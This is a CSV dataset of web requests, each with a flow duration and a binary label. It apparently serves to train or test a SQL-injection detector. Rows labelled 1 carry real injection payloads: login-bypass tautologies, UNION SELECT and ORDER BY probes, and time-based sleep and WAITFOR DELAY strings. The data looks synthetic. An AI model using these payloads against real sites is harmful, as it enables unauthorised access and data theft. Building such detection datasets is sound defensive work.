text,flow_duration,label
POST /search {'keyword': '\\'},97904,1
POST /profile/update {'email': 'test.user@example.com'},23471,0
GET /images/products/G.jpg,79833,0
"GET /search.aspx?q=1' ORDER BY 1,2,3--+",1434,1
GET /products/details?productID=1*1,2402,1
GET /items/show.php?id=1024-2,43047,1
"POST /api/v1/cart/add {'item_id': '2307', 'quantity': 3}",37908,0
GET /products/details?productID=l,96149,0
GET /api/v1/users?id=' or 'x'='x,135410,1
GET /search?q=1 AND 1=1,118019,1
GET /admin/login?user=' OR 1=1 /*,5602,1
GET /images/products/t.jpg,69046,0
GET /images/products/Z.jpg,17131,0
GET /images/products/x.jpg,12305,0
GET /blog/posts?page=11,12020,0
POST /search {'keyword': '' OR 1=1--'},56750,1
"POST /api/v1/cart/add {'item_id': '1771', 'quantity': 2}",24716,0
POST /search {'keyword': 'user1' or 1=1 --'},45995,1
GET /products/details?productID=p,22082,0
GET /images/products/g.jpg,55362,0
GET /admin/login?user=OR+%271%27%3D%271,7060,1
GET /api/v1/users?id=user1' or 1=1 --,149,1
GET /search?q=1' OR '1'='1' --,1184,1
"POST /api/v1/cart/add {'item_id': '2376', 'quantity': 5}",22992,0
GET /products/details?productID=' OR '1'='1,4271,1
GET /images/products/U.jpg,74392,0
GET /api/v1/users?id=1702,53244,0
GET /api/v1/users?id=3230,99462,0
POST /profile/update {'email': 'test.user@example.com'},47008,0
POST /profile/update {'email': 'test.user@example.com'},136199,0
GET /user/profile?user_id=\\,117139,1
POST /search {'keyword': '1=1'},7551,1
"POST /api/v1/cart/add {'item_id': '2146', 'quantity': 5}",104002,0
"POST /login {'user': 'b', 'pass': 'password123'}",12006,0
GET /search?q=B,32159,0
GET /products/details?productID=' or 'x'='x,4050,1
GET /search?q=';WAITFOR DELAY '0:0:30'--,106237,1
GET /products/electronics/E,149903,0
GET /products/details?productID=5,56443,0
"POST /login.php {'username': '' or 1=1 limit 1 --', 'password': 'password'}",7714,1
"POST /login {'user': '-- or #', 'pass': 'password123'}",83834,1
GET /products/details?productID=Z,5953,0
GET /index.php?page=' OR 1=1--,5163,1
"POST /login {'user': '4', 'pass': 'password123'}",65232,0
"POST /login {'user': 'o', 'pass': 'password123'}",21337,0
GET /search?q=W,107177,0
GET /search.aspx?q=user1' or 1=1 --,4640,1
GET /api/v1/users?id=OR '1'='1',50381,1
"POST /login {'user': 'j', 'pass': 'password123'}",46360,0
GET /assets/css/main.css,89373,0
"POST /login.php {'username': ''admin'--', 'password': 'password'}",2774,1
POST /profile/update {'email': 'test.user@example.com'},48759,0
GET /search?q=7,28874,0
GET /products/details?productID=' OR '1'='1,31932,1
"POST /api/v1/cart/add {'item_id': '9201', 'quantity': 5}",57344,0
"POST /login {'user': ',(select * from (select(sleep(10)))a)', 'pass': 'password123'}",7595,1
GET /products/home/W,37466,0
GET /user/profile?user_id=smith' OR '1'='1,41871,1
GET /search?q=AND 1,46568,1
GET /search?q=H,25055,0
GET /index.php?page=1024-2,140214,1
GET /products/details?productID=3,20461,0
GET /products/details?productID=' OR 'x'='x,4204,1
GET /items/show.php?id=OR '1'='1',46219,1
GET /images/products/A.jpg,65767,0
GET /user/profile?user_id=1' and '1'='1,6629,1
GET /search?q=1' and '1'='1,55161,1
GET /items/show.php?id=' or 'x'='x,33916,1
GET /api/v1/users?id=6700,32433,0
"POST /api/v1/cart/add {'item_id': '3142', 'quantity': 4}",31860,0
GET /products/details?productID=' OR 'x'='x,71726,1
GET /assets/css/main.css,85787,0
GET /products/details?productID=f,68006,0
GET /search.aspx?q=105-1,102778,1
GET /api/v1/users?id=3246,85716,0
POST /profile/update {'email': 'test.user@example.com'},77273,0
POST /search {'keyword': ''admin'--'},4131,1
GET /products/books/U,51758,0
"POST /login {'user': 'r', 'pass': 'password123'}",50410,0
GET /search?q=J,105758,0
POST /search {'keyword': '' or 1=1 limit 1 --'},134206,1
"POST /login {'user': ''admin'--', 'pass': 'password123'}",17187,1
"GET /user/profile?user_id=,",3760,1
GET /user/profile?user_id=1*1,64183,1
GET /assets/css/main.css,120197,0
GET /api/v1/users?id=3153,4080,0
GET /products/details?productID=1' ORDER BY 1--+,7874,1
GET /products/details?productID=1,8104,0
GET /api/v1/users?id=smith' OR '1'='1,1233,1
"POST /login {'user': 'user1' or 1=1 --', 'pass': 'password123'}",19010,1
GET /assets/css/main.css,85304,0
GET /products/details?productID=P,9333,0
GET /user/profile?user_id=-- or #,3345,1
GET /assets/css/main.css,35816,0
GET /search?q=e,71276,0
GET /search.aspx?q=OR+%271%27%3D%271,2664,1
GET /search?q=user1' or 1=1 --,8000,1
GET /admin/login?user=' OR 1 -- -,59122,1
GET /api/v1/users?id=' OR '1,7853,1
"POST /login {'user': 'N', 'pass': 'password123'}",134964,0
GET /user/profile?user_id=x' or 1=1--,2889,1
POST /search {'keyword': '1' OR '1'='1' --'},5682,1
GET /user/profile?user_id=' OR 1=1 /*,5217,1
GET /search?q=' OR 1=1 /*,5527,1
GET /items/show.php?id=1' OR '1'='1' --,7187,1
GET /products/details?productID=' or 'x'='x,6602,1
GET /blog/posts?page=13,129420,0
GET /search?q=' OR 1=1 /*,5238,1
GET /api/v1/users?id=admin' #,7211,1
GET /products/details?productID=e,94082,0
GET /search?q=' or 'x'='x,2099,1
GET /search.aspx?q=OR+%271%27%3D%271,46951,1
"POST /login {'user': 'x', 'pass': 'password123'}",56515,0
GET /api/v1/users?id=3359,34397,0
GET /api/v1/users?id='admin'--,101511,1
GET /user/profile?user_id=105-1,3074,1
"POST /login {'user': 'j', 'pass': 'password123'}",148270,0
GET /api/v1/users?id=3277,32743,0
GET /images/products/n.jpg,110596,0
GET /products/details?productID=OR '1'='1',65847,1
GET /products/details?productID=V,117707,0
GET /images/products/j.jpg,56164,0
GET /blog/posts?page=18,147833,0
GET /search?q=Y,41064,0
GET /products/home/b,15948,0
POST /profile/update {'email': 'test.user@example.com'},80060,0
POST /profile/update {'email': 'test.user@example.com'},34673,0
GET /admin/login?user=OR '1'='1',25624,1
GET /search.aspx?q=1 AND 1=1,6119,1
"POST /api/v1/cart/add {'item_id': '1737', 'quantity': 3}",72936,0
GET /products/details?productID=' OR '1'='1,62700,1
POST /search {'keyword': '' AND user IS NULL; --'},84121,1
"POST /login {'user': 'r', 'pass': 'password123'}",23576,0
GET /images/products/B.jpg,18182,0
GET /products/details?productID=1' and '1'='1,424,1
GET /api/v1/users?id=' OR 1=1 /*,87896,1
"POST /login.php {'username': '1 AND 1=1', 'password': 'password'}",91394,1
GET /products/details?productID=b,49678,0
GET /blog/posts?page=18,79889,0
GET /products/details?productID=W,28585,0
GET /products/details?productID=8,137133,0
GET /images/products/k.jpg,4672,0
GET /user/profile?user_id=' OR 1=1--,3679,1
GET /api/v1/users?id=' or 'x'='x,114224,1
GET /user/profile?user_id=1 AND 1=1,554,1
GET /images/products/R.jpg,64953,0
GET /products/details?productID=k,101238,0
GET /search?q=o,144250,0
GET /api/v1/users?id=1*56,3249,1
GET /products/books/0,30092,0
GET /products/details?productID=X,51915,0
GET /search?q=z,84033,0
GET /items/show.php?id=' OR '1'='1,81857,1
GET /products/details?productID=/,6434,1
GET /images/products/O.jpg,51094,0
GET /items/show.php?id=/*…*/,144278,1
GET /images/products/T.jpg,9902,0
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",1230,1
"POST /login.php {'username': '' OR 1 -- -', 'password': 'password'}",6825,1
GET /api/v1/users?id=7904,103294,0
"POST /login {'user': '' OR 1=1--', 'pass': 'password123'}",13973,1
GET /items/show.php?id=1024-2,66786,1
GET /api/v1/users?id=102,66517,0
GET /search.aspx?q=AND false,106793,1
"POST /login {'user': 'W', 'pass': 'password123'}",78667,0
GET /products/details?productID=\\,6176,1
"POST /login {'user': '5', 'pass': 'password123'}",37210,0
"POST /login {'user': 'P', 'pass': 'password123'}",28046,0
GET /search?q=U,98020,0
GET /search.aspx?q=1 AND 1=1,6716,1
GET /index.php?page=x' or 1=1--,1080,1
GET /search?q=Z,80406,0
GET /products/details?productID=J,66740,0
POST /search {'keyword': '' or 'x'='x'},7521,1
"GET /products/details?productID=""""",142667,1
GET /api/v1/users?id=/,68176,1
GET /search.aspx?q=1*1,2704,1
GET /items/show.php?id=;,6279,1
"POST /login {'user': '1' and '1'='1', 'pass': 'password123'}",66445,1
"POST /login.php {'username': 'OR+%271%27%3D%271', 'password': 'password'}",65255,1
GET /products/electronics/z,72099,0
"POST /login {'user': '105-1', 'pass': 'password123'}",753,1
GET /search.aspx?q=1=1,465,1
GET /search.aspx?q=1' OR '1'='1' --,76124,1
GET /search?q=D,140722,0
GET /admin/login?user=AND true,33162,1
"POST /login {'user': 'admin' #', 'pass': 'password123'}",6856,1
GET /search?q=X,80413,0
GET /api/v1/users?id=3734,71371,0
GET /images/products/w.jpg,111126,0
GET /items/show.php?id=' OR 1=1 /*,131630,1
GET /user/profile?user_id=\,1350,1
GET /search.aspx?q=OR '1'='1',145394,1
GET /search?q=i,95192,0
"GET /items/show.php?id=-1' UNION SELECT 1,2,3--+",120222,1
GET /api/v1/users?id=9188,66561,0
GET /products/books/W,32905,0
GET /products/details?productID=\\,2420,1
GET /products/details?productID=%2c(select%20*%20from%20(select(sleep(10)))a),1645,1
"POST /login.php {'username': '1*1', 'password': 'password'}",2803,1
"POST /login.php {'username': '' UNION SELECT sum(columnname) from tablename --', 'password': 'password'}",781,1
GET /blog/posts?page=9,76436,0
GET /api/v1/users?id=9280,80224,0
GET /blog/posts?page=13,146057,0
GET /api/v1/users?id=1' and '1'='1,7028,1
GET /api/v1/users?id=6252,72352,0
GET /api/v1/users?id=1' and '1'='1,6991,1
POST /profile/update {'email': 'test.user@example.com'},98446,0
GET /assets/css/main.css,10989,0
GET /blog/posts?page=9,144999,0
POST /search {'keyword': '1 AND 1=1'},3808,1
GET /products/details?productID=d,68034,0
GET /search.aspx?q=' OR 1=1 /*,21861,1
"POST /login.php {'username': '1=1', 'password': 'password'}",2720,1
GET /products/electronics/t,35873,0
"POST /api/v1/cart/add {'item_id': '2320', 'quantity': 4}",49231,0
"POST /login {'user': '1024-2', 'pass': 'password123'}",6715,1
GET /images/products/g.jpg,121563,0
GET /blog/posts?page=14,19526,0
GET /blog/posts?page=18,42063,0
GET /blog/posts?page=8,28849,0
"POST /login.php {'username': '1 AND 1=1', 'password': 'password'}",193,1
GET /admin/login?user='admin'--,1300,1
GET /admin/login?user=1' ORDER BY 1--+,46544,1
GET /images/products/z.jpg,16126,0
GET /search?q=E,9169,0
GET /api/v1/users?id=1673,64262,0
GET /search?q=2,16670,0
GET /search?q=o,21892,0
GET /admin/login?user=' or 1=1 limit 1 --,127414,1
GET /api/v1/users?id=8413,25325,0
"POST /api/v1/cart/add {'item_id': '4071', 'quantity': 2}",70995,0
GET /blog/posts?page=10,32051,0
"POST /login {'user': 'V', 'pass': 'password123'}",73848,0
GET /search?q=1' OR '1'='1' --,7485,1
GET /images/products/f.jpg,4172,0
GET /products/electronics/J,22362,0
"POST /login.php {'username': '1' and '1'='1', 'password': 'password'}",35733,1
"POST /login {'user': 'T', 'pass': 'password123'}",147644,0
GET /products/details?productID=105-1,73293,1
"POST /login {'user': 'g', 'pass': 'password123'}",70451,0
GET /search?q=' OR 1=1--,98204,1
GET /search?q=' OR 1=1--,45694,1
GET /api/v1/users?id=' OR 1=1--,120109,1
GET /blog/posts?page=10,134235,0
GET /search?q=K,89628,0
GET /search.aspx?q=-2,3149,1
"POST /login {'user': 'M', 'pass': 'password123'}",71250,0
GET /blog/posts?page=19,135429,0
GET /api/v1/users?id=smith' OR '1'='1,4066,1
"POST /login.php {'username': '1' and '1'='1', 'password': 'password'}",45916,1
GET /items/show.php?id=OR '1'='1',7281,1
GET /user/profile?user_id=' OR 1=1--,77519,1
GET /assets/css/main.css,18301,0
"POST /login {'user': '1*1', 'pass': 'password123'}",4723,1
"POST /login.php {'username': 'user1' or 1=1 --', 'password': 'password'}",1237,1
GET /products/details?productID=x' or 1=1--,112483,1
GET /search?q=Q,113297,0
"POST /api/v1/cart/add {'item_id': '6181', 'quantity': 3}",134133,0
GET /items/show.php?id=' OR 1=1 /*,5142,1
POST /profile/update {'email': 'test.user@example.com'},76692,0
GET /assets/css/main.css,120920,0
GET /products/electronics/4,57296,0
GET /blog/posts?page=10,90297,0
GET /admin/login?user=' OR 1=1 /*,6164,1
"POST /login {'user': 'Z', 'pass': 'password123'}",38031,0
"POST /login {'user': '' OR 1=1--', 'pass': 'password123'}",96709,1
GET /products/details?productID=I,138594,0
GET /products/details?productID=S,57253,0
GET /products/details?productID=1' OR '1'='1' --,6087,1
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",120770,1
"POST /login {'user': '105-1', 'pass': 'password123'}",3630,1
GET /search.aspx?q=' OR 1=1 /*,5771,1
GET /api/v1/users?id=smith' OR '1'='1,5816,1
GET /search?q=3,11319,0
GET /search.aspx?q=1024-2,18067,1
GET /images/products/w.jpg,44197,0
GET /search?q=G,88879,0
"POST /login {'user': 'admin' #', 'pass': 'password123'}",20648,1
GET /products/details?productID=g,44991,0
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",104330,1
GET /search?q=x' or 1=1--,2090,1
POST /profile/update {'email': 'test.user@example.com'},9333,0
GET /items/show.php?id=user1' or 1=1 --,2577,1
GET /api/v1/users?id=2257,127897,0
GET /api/v1/users?id=782,76382,0
GET /search?q=OR '1'='1',143547,1
POST /search {'keyword': '' OR 1=1 /*'},274,1
GET /index.php?page=' OR 1=1--,1923,1
POST /profile/update {'email': 'test.user@example.com'},62748,0
GET /blog/posts?page=5,142164,0
GET /products/details?productID=1' OR '1'='1' --,4288,1
"POST /api/v1/cart/add {'item_id': '3747', 'quantity': 4}",26109,0
"POST /api/v1/cart/add {'item_id': '2307', 'quantity': 3}",127591,0
GET /images/products/9.jpg,34882,0
GET /search.aspx?q=x' or 1=1--,72727,1
"POST /login {'user': ''=0--+', 'pass': 'password123'}",46405,1
GET /items/show.php?id=1*1,4877,1
GET /products/details?productID=admin' #,83032,1
GET /products/details?productID=O,42109,0
GET /products/books/d,147245,0
GET /products/details?productID=h,82305,0
GET /search?q=\,144991,1
GET /admin/login?user=OR+%271%27%3D%271,5138,1
GET /user/profile?user_id=' AND user IS NULL; --,4312,1
"POST /login {'user': '1024-2', 'pass': 'password123'}",143724,1
GET /search?q=1=1,46279,1
GET /products/books/x,45012,0
GET /images/products/a.jpg,136171,0
"POST /api/v1/cart/add {'item_id': '6475', 'quantity': 3}",40340,0
GET /user/profile?user_id=1*1,11116,1
GET /search?q=' OR '' = ',104064,1
GET /search?q=' OR '1,30807,1
GET /images/products/v.jpg,99515,0
GET /images/products/t.jpg,87909,0
"GET /user/profile?user_id=1' GROUP BY 1,2,--+",6445,1
GET /api/v1/users?id=7095,6117,0
GET /search?q=i,73771,0
"GET /products/details?productID=-1' UNION SELECT 1,2,3--+",2269,1
"POST /login {'user': '105-1', 'pass': 'password123'}",120506,1
POST /profile/update {'email': 'test.user@example.com'},5409,0
GET /products/details?productID=o,51539,0
GET /search?q=Q,132102,0
GET /products/details?productID=1=1,50576,1
GET /blog/posts?page=6,39118,0
"POST /login {'user': 'W', 'pass': 'password123'}",89056,0
POST /search {'keyword': '' OR 1=1--'},76987,1
GET /search?q=F,63176,0
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",38145,1
GET /index.php?page=x' or 1=1--,94248,1
GET /admin/login?user=1' OR '1'='1' --,1823,1
"POST /login.php {'username': '' OR 'x'='x', 'password': 'password'}",119656,1
"POST /login.php {'username': '' OR '1'='1', 'password': 'password'}",5690,1
"GET /user/profile?user_id=1' GROUP BY 1,2,--+",39950,1
GET /items/show.php?id=105-1,5478,1
"POST /login {'user': 'S', 'pass': 'password123'}",71578,0
GET /blog/posts?page=8,57220,0
GET /blog/posts?page=8,87176,0
"POST /api/v1/cart/add {'item_id': '1283', 'quantity': 3}",13296,0
GET /api/v1/users?id=x' or 1=1--,24805,1
GET /search?q=1' and '1'='1,5865,1
GET /user/profile?user_id=' AND user IS NULL; --,86936,1
"POST /login {'user': '8', 'pass': 'password123'}",69307,0
"POST /search {'keyword': '' AND MID(VERSION(),1,1) = '5';'}",3017,1
GET /search?q=U,64918,0
GET /products/details?productID=' or 1=1 limit 1 --,31828,1
"POST /login.php {'username': '//', 'password': 'password'}",81497,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",6438,1
POST /search {'keyword': 'x' or 1=1--'},57847,1
"POST /login {'user': 'admin' #', 'pass': 'password123'}",120307,1
GET /products/details?productID=1' OR '1'='1' --,7808,1
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",4092,1
GET /blog/posts?page=5,136728,0
"POST /login {'user': 'U', 'pass': 'password123'}",76929,0
GET /products/details?productID=u,106695,0
GET /index.php?page='''''''''''''UNION SELECT '2,1173,1
GET /api/v1/users?id=1362,113437,0
GET /user/profile?user_id=x' or 1=1--,2863,1
"POST /login.php {'username': '' OR 1=1 /*', 'password': 'password'}",25735,1
GET /assets/css/main.css,12153,0
GET /items/show.php?id=' or 1=1 limit 1 --,4439,1
GET /search?q=K,121392,0
GET /user/profile?user_id='=',7801,1
"POST /api/v1/cart/add {'item_id': '7278', 'quantity': 3}",5127,0
POST /profile/update {'email': 'test.user@example.com'},64017,0
"POST /login.php {'username': ''='', 'password': 'password'}",1727,1
GET /index.php?page='=0--+,3656,1
"POST /login {'user': '2', 'pass': 'password123'}",4776,0
GET /products/details?productID=f,46374,0
POST /profile/update {'email': 'test.user@example.com'},83863,0
GET /api/v1/users?id=898,12594,0
"POST /login.php {'username': ''admin'--', 'password': 'password'}",50,1
GET /api/v1/users?id=7045,59542,0
GET /products/books/Q,16412,0
"POST /login {'user': 'l', 'pass': 'password123'}",69015,0
GET /api/v1/users?id=5270,64796,0
"POST /api/v1/cart/add {'item_id': '9966', 'quantity': 1}",49829,0
"GET /admin/login?user=""""",4347,1
GET /products/details?productID=user1' or 1=1 --,2656,1
GET /search?q=' OR 1=1 /*,5105,1
"POST /login {'user': '1 AND 1=1', 'pass': 'password123'}",14614,1
GET /user/profile?user_id=1*1,6218,1
GET /products/home/A,85008,0
"POST /login {'user': 'i', 'pass': 'password123'}",138061,0
GET /api/v1/users?id=6215,25676,0
GET /blog/posts?page=2,17677,0
GET /search?q=G,42202,0
GET /admin/login?user=admin' #,5048,1
GET /products/details?productID=o,54528,0
GET /admin/login?user='LIKE',7311,1
GET /assets/css/main.css,39830,0
GET /api/v1/users?id=' OR 'x'='x,11434,1
GET /blog/posts?page=1,76848,0
GET /products/home/3,30235,0
"POST /login.php {'username': '105-1', 'password': 'password'}",7042,1
GET /api/v1/users?id=9340,4216,0
GET /index.php?page=' OR 'x'='x,5546,1
GET /user/profile?user_id=' OR '1'='1,50437,1
GET /search?q=R,19473,0
GET /products/details?productID=x' or 1=1--,27011,1
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",7811,1
GET /admin/login?user=smith' OR '1'='1,3906,1
GET /assets/css/main.css,27885,0
POST /profile/update {'email': 'test.user@example.com'},134655,0
GET /search.aspx?q='admin'--,16221,1
POST /search {'keyword': 'user1' or 1=1 --'},88066,1
POST /profile/update {'email': 'test.user@example.com'},61252,0
"POST /api/v1/cart/add {'item_id': '1468', 'quantity': 1}",78639,0
GET /api/v1/users?id=3011,126595,0
"POST /login {'user': 'M', 'pass': 'password123'}",58105,0
"POST /api/v1/cart/add {'item_id': '2352', 'quantity': 1}",104924,0
GET /products/details?productID=OR '1'='1',1636,1
GET /search.aspx?q=admin' #,1259,1
GET /index.php?page=1*1,5319,1
GET /index.php?page=1' OR '1'='1' --,1566,1
"POST /login {'user': '-1 UNION SELECT 1 INTO @,@,@', 'pass': 'password123'}",7362,1
"POST /login.php {'username': 'admin' #', 'password': 'password'}",134537,1
GET /search?q=q,83228,0
GET /products/electronics/1,37389,0
GET /assets/css/main.css,63406,0
GET /api/v1/users?id=1024-2,606,1
GET /admin/login?user=' or 1=1 limit 1 --,39121,1
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",1195,1
GET /search.aspx?q='admin'--,308,1
"POST /login.php {'username': 'AND false', 'password': 'password'}",7775,1
"POST /login.php {'username': '\', 'password': 'password'}",4456,1
GET /images/products/L.jpg,13827,0
POST /profile/update {'email': 'test.user@example.com'},60538,0
GET /products/details?productID=K,52575,0
"POST /api/v1/cart/add {'item_id': '5954', 'quantity': 5}",40130,0
"POST /api/v1/cart/add {'item_id': '5909', 'quantity': 4}",6793,0
GET /search?q=D,85071,0
GET /api/v1/users?id=8149,49848,0
GET /index.php?page=admin' #,7669,1
GET /search?q=' or 1=1 limit 1 --,35533,1
GET /assets/css/main.css,76992,0
GET /search?q='LIKE',2561,1
GET /api/v1/users?id=6996,19989,0
"POST /api/v1/cart/add {'item_id': '8290', 'quantity': 3}",59433,0
GET /products/details?productID=R,115342,0
GET /assets/css/main.css,33284,0
GET /search?q=9,46987,0
GET /api/v1/users?id=663,21598,0
GET /user/profile?user_id=OR+%271%27%3D%271,1289,1
GET /images/products/r.jpg,17591,0
GET /api/v1/users?id=5048,59384,0
"POST /login {'user': 'n', 'pass': 'password123'}",58915,0
"POST /api/v1/cart/add {'item_id': '5593', 'quantity': 3}",7417,0
GET /admin/login?user=' OR 'x'='x,842,1
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",36264,1
GET /admin/login?user=1024-2,1548,1
GET /search?q=U,57373,0
GET /user/profile?user_id=user1' or 1=1 --,65819,1
GET /images/products/M.jpg,35742,0
"POST /api/v1/cart/add {'item_id': '7794', 'quantity': 4}",139110,0
GET /products/books/L,73960,0
GET /blog/posts?page=6,49300,0
"POST /api/v1/cart/add {'item_id': '6356', 'quantity': 2}",130141,0
GET /api/v1/users?id=656,81608,0
GET /products/details?productID=' GROUP BY columnnames having 1=1 --,42424,1
GET /items/show.php?id=' OR 1=1--,122208,1
GET /products/details?productID='admin'--,5897,1
"POST /login.php {'username': ''admin'--', 'password': 'password'}",93127,1
GET /api/v1/users?id=8779,99062,0
GET /products/details?productID=d,52769,0
GET /items/show.php?id=' OR '1'='1,7949,1
GET /blog/posts?page=16,17823,0
GET /products/details?productID=r,22707,0
GET /api/v1/users?id=' OR '' = ',4484,1
GET /api/v1/users?id=5589,38876,0
GET /search?q=' AND user IS NULL; --,124846,1
GET /products/details?productID=J,43989,0
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",116570,1
"POST /login {'user': '5', 'pass': 'password123'}",45375,0
GET /search?q=user1' or 1=1 --,53922,1
GET /search.aspx?q=' or 1=1 limit 1 --,108401,1
GET /assets/css/main.css,76874,0
GET /blog/posts?page=15,6670,0
GET /index.php?page=1=1,3569,1
"POST /login {'user': 'V', 'pass': 'password123'}",24493,0
"POST /api/v1/cart/add {'item_id': '3867', 'quantity': 5}",56144,0
GET /user/profile?user_id=1' ORDER BY 3--+,44975,1
GET /user/profile?user_id=1' OR '1'='1' --,1057,1
GET /user/profile?user_id=1=1,101202,1
GET /admin/login?user=' OR 'x'='x,88761,1
GET /products/details?productID=' OR 1=1 /*,2514,1
GET /api/v1/users?id=4522,20099,0
GET /products/details?productID=smith' OR '1'='1,28050,1
GET /products/details?productID=OR+%271%27%3D%271,59947,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",127453,1
GET /blog/posts?page=18,28995,0
GET /api/v1/users?id=7554,46638,0
GET /search.aspx?q=smith' OR '1'='1,3344,1
POST /profile/update {'email': 'test.user@example.com'},88258,0
GET /products/details?productID=d,82347,0
GET /admin/login?user=OR '1'='1',18677,1
GET /products/details?productID=1*1,3020,1
GET /search?q=' OR 'x'='x,98946,1
GET /api/v1/users?id=267,15921,0
"POST /login {'user': 'b', 'pass': 'password123'}",61889,0
GET /search?q=6,55432,0
GET /api/v1/users?id=2155,53187,0
GET /products/electronics/w,80087,0
"POST /login {'user': '""""', 'pass': 'password123'}",7873,1
GET /assets/css/main.css,31590,0
"GET /items/show.php?id=1' GROUP BY 1,2,--+",82719,1
"POST /login.php {'username': '' OR 'x'='x', 'password': 'password'}",53687,1
POST /search {'keyword': '105-1'},2948,1
GET /blog/posts?page=3,51122,0
GET /blog/posts?page=11,130042,0
"POST /login {'user': 'u', 'pass': 'password123'}",20836,0
"POST /login.php {'username': ''admin'--', 'password': 'password'}",4248,1
GET /search?q=`,86644,1
POST /search {'keyword': '' OR '1'},62918,1
"POST /api/v1/cart/add {'item_id': '7909', 'quantity': 1}",21890,0
GET /items/show.php?id=' AND user IS NULL; --,6029,1
GET /assets/css/main.css,11910,0
GET /products/details?productID=' or 1=1 limit 1 --,34006,1
GET /products/books/J,66240,0
"POST /login {'user': '%2c(select%20*%20from%20(select(sleep(10)))a)', 'pass': 'password123'}",48633,1
GET /products/details?productID=c,79719,0
GET /images/products/Y.jpg,14061,0
"GET /products/details?productID=,(select * from (select(sleep(10)))a)",127135,1
GET /items/show.php?id=1' and '1'='1,149499,1
GET /user/profile?user_id=1' OR '1'='1' --,70946,1
GET /items/show.php?id=\\,115259,1
GET /search?q=105-1,117484,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",101728,1
GET /products/details?productID=X,37155,0
"POST /login.php {'username': '' OR 'x'='x', 'password': 'password'}",92239,1
GET /api/v1/users?id=6486,105498,0
GET /images/products/F.jpg,45079,0
"POST /login.php {'username': 'OR+%271%27%3D%271', 'password': 'password'}",5966,1
GET /images/products/O.jpg,23702,0
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",1542,1
POST /profile/update {'email': 'test.user@example.com'},66896,0
GET /images/products/x.jpg,86331,0
GET /images/products/w.jpg,128145,0
GET /search?q=G,67287,0
GET /user/profile?user_id='admin'--,4635,1
GET /api/v1/users?id=6320,126474,0
GET /products/details?productID=' or 1=1 limit 1 --,139304,1
GET /api/v1/users?id=9852,77830,0
"POST /login {'user': ',', 'pass': 'password123'}",1478,1
"POST /login {'user': '' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --', 'pass': 'password123'}",1344,1
"GET /products/details?productID=-1 UNION SELECT 1 INTO @,@",2607,1
GET /images/products/G.jpg,46480,0
GET /products/books/Q,72552,0
GET /products/books/v,61039,0
GET /images/products/V.jpg,130121,0
GET /images/products/K.jpg,72586,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",6680,1
"POST /api/v1/cart/add {'item_id': '9385', 'quantity': 3}",9338,0
POST /search {'keyword': '1024-2'},70673,1
GET /assets/css/main.css,44498,0
GET /search?q=n,14746,0
POST /search {'keyword': 'admin' #'},3772,1
POST /search {'keyword': '' or 'x'='x'},7452,1
GET /blog/posts?page=8,59524,0
POST /profile/update {'email': 'test.user@example.com'},87459,0
GET /assets/css/main.css,112243,0
GET /products/books/y,50498,0
GET /admin/login?user=smith' OR '1'='1,112889,1
"POST /api/v1/cart/add {'item_id': '9889', 'quantity': 1}",18406,0
GET /user/profile?user_id=\,81458,1
POST /search {'keyword': '1 AND 1=1'},3378,1
GET /products/details?productID=1' ORDER BY 1--+,5566,1
GET /api/v1/users?id=3496,68133,0
GET /api/v1/users?id=4135,73410,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",3175,1
"GET /items/show.php?id=1' ORDER BY 1,2,3--+",581,1
GET /products/details?productID=x' or 1=1--,142831,1
GET /api/v1/users?id=4715,89958,0
POST /profile/update {'email': 'test.user@example.com'},54431,0
"POST /login {'user': '1' and '1'='1', 'pass': 'password123'}",26566,1
GET /products/details?productID=7,19057,0
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",4174,1
GET /user/profile?user_id=' OR '1'='1,116075,1
GET /index.php?page=1' and '1'='1,4826,1
GET /user/profile?user_id=\,79723,1
